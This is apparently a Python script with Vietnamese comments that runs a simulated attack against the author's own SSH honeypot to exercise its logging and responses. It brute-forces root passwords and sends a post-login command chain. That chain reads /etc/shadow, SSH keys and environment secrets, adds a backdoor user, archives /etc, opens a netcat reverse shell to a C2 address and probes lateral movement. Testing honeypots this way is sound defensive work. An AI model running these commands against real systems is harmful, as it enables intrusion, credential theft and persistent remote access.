#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Live Attack Simulator against Adaptive SSH Honeypot (Port 2222 on 192.168.101.218).
Executes:
1. Brute-force password guessing attempts (failed logins).
2. Successful login with decoy credentials.
3. Multi-stage attack execution:
   - System & Network Discovery (uname, id, ip a, netstat, ps)
   - Credential Harvesting (/etc/passwd, /etc/shadow, id_rsa, notes.txt)
   - Persistence & User Creation (useradd, crontab)
   - Collection & Archiving (tar -czf)
   - C2 Reverse Shell & Lateral Movement probe (nc, ssh internal)
   - Safe cleanup & exit.
"""

import sys
import io
import time
import socket
import paramiko
import json

if sys.platform == "win32":
    try:
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8")
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8")
    except Exception:
        pass

HONEYPOT_HOST = "192.168.101.218"
HONEYPOT_PORT = 2222

def simulate_brute_force():
    print("=" * 70)
    print("💥 [GIAI ĐOẠN 1] BẮT ĐẦU TẤN CÔNG DÒ MẬT KHẨU (SSH BRUTE-FORCE)...")
    print(f"🎯 Mục tiêu: {HONEYPOT_HOST}:{HONEYPOT_PORT}")
    print("=" * 70)

    passwords_to_try = ["admin123", "password", "qwerty", "toor", "12345678"]
    
    for pwd in passwords_to_try:
        print(f"[*] Thử đăng nhập user 'root' với mật khẩu '{pwd}'...")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(HONEYPOT_HOST, port=HONEYPOT_PORT, username="root", password=pwd, timeout=4)
            print(f"[!] Bất ngờ đăng nhập được với: {pwd}")
            client.close()
        except paramiko.AuthenticationException:
            print(f"  -> Honeypot từ chối: Authentication failed (Đã ghi log Auth_Failed)")
        except Exception as e:
            print(f"  -> Kết nối lỗi: {e}")
        time.sleep(0.4)

def simulate_interactive_intrusion():
    print("\n" + "=" * 70)
    print("🔓 [GIAI ĐOẠN 2] ĐĂNG NHẬP THÀNH CÔNG VÀ TIẾN HÀNH KHAI THÁC SHELL...")
    print("=" * 70)

    target_user = "root"
    target_pass = "supersecretpassword123"

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"[*] Kết nối SSH với user '{target_user}' và mật khẩu '{target_pass}'...")
        client.connect(HONEYPOT_HOST, port=HONEYPOT_PORT, username=target_user, password=target_pass, timeout=6)
        print("[+] ĐĂNG NHẬP THÀNH CÔNG! Đang khởi tạo Interactive Terminal...")

        channel = client.invoke_shell()
        time.sleep(1.0)
        
        banner = ""
        while channel.recv_ready():
            banner += channel.recv(4096).decode("utf-8", errors="ignore")
        print(f"\n[+] BANNER NHẬN ĐƯỢC TỪ HONEYPOT:\n{banner.strip()}\n")

        # Chuỗi lệnh tấn công thực tế
        attack_commands = [
            # 1. Trinh sát hệ thống
            ("whoami", "Kiểm tra quyền tài khoản hiện tại"),
            ("id", "Kiểm tra UID/GID và Group memberships"),
            ("uname -a", "Thu thập thông tin Kernel và OS release"),
            ("hostname", "Xác định tên máy chủ"),
            ("uptime", "Kiểm tra thời gian hoạt động của máy"),
            ("df -h", "Kiểm tra dung lượng ổ đĩa"),
            ("free -m", "Kiểm tra bộ nhớ RAM"),
            ("ip a", "Thu thập cấu hình card mạng & IP"),
            ("netstat -tlpn", "Kiểm tra các cổng đang mở"),
            ("ps aux", "Liệt kê tiến trình đang chạy trên hệ thống"),

            # 2. Thu thập chứng thư & mật khẩu
            ("cat /etc/passwd", "Đọc danh sách tài khoản cục bộ"),
            ("cat /etc/shadow", "Thử đọc tệp shadow chứa hash mật khẩu"),
            ("cat ~/.ssh/id_rsa", "Tìm kiếm private key SSH"),
            ("cat /root/notes.txt", "Tìm tài liệu ghi chú mật khẩu"),
            ("env", "Đọc biến môi trường tìm API Key / Secret"),

            # 3. Thao tác tệp & Tạo backdoor / Persistence
            ("cd /tmp", "Di chuyển vào thư mục tạm /tmp"),
            ("echo 'MALWARE_PAYLOAD_STAGE2_CONNECTED' > /tmp/payload.sh", "Tạo file mã độc trong /tmp"),
            ("chmod +x /tmp/payload.sh", "Cấp quyền thực thi cho payload"),
            ("ls -la /tmp", "Xác nhận payload đã được tạo trong VFS"),
            ("cat /tmp/payload.sh", "Kiểm tra nội dung payload"),
            ("useradd -m -s /bin/bash sys_backup_user", "Tạo user backdoor duy trì quyền truy cập"),

            # 4. Thu thập & Nén dữ liệu (Collection)
            ("tar -czf /tmp/backup_conf.tar.gz /etc", "Nén thư mục cấu hình /etc"),

            # 5. Di chuyển ngang & Reverse Shell
            ("nc -e /bin/bash 10.0.1.50 4444", "Thử mở reverse shell về server C2"),
            ("ssh root@10.0.1.50", "Thử di chuyển ngang SSH sang IP nội bộ LAN"),

            # 6. Thoát phiên
            ("exit", "Đóng phiên tương tác an toàn")
        ]

        for cmd, purpose in attack_commands:
            print(f"\n⚔️ [ATTACKER] >> {cmd} ({purpose})")
            channel.send(cmd + "\r")
            time.sleep(0.5)

            response = ""
            while channel.recv_ready():
                response += channel.recv(4096).decode("utf-8", errors="ignore")
            
            clean_resp = response.strip()
            # Bỏ echo lệnh nếu có
            if clean_resp:
                print(f"🤖 [HONEYPOT AI REP]:\n{clean_resp}")
            else:
                print(f"🤖 [HONEYPOT AI REP]: (Lệnh thực thi thành công trong im lặng)")

        client.close()
        print("\n" + "=" * 70)
        print("✅ ĐÃ HOÀN TẤT CHUỖI TẤN CÔNG THỰC TẾ LÊN HONEYPOT!")
        print("=" * 70)

    except Exception as e:
        print(f"[!] Lỗi trong quá trình tấn công: {e}")

if __name__ == "__main__":
    simulate_brute_force()
    simulate_interactive_intrusion()
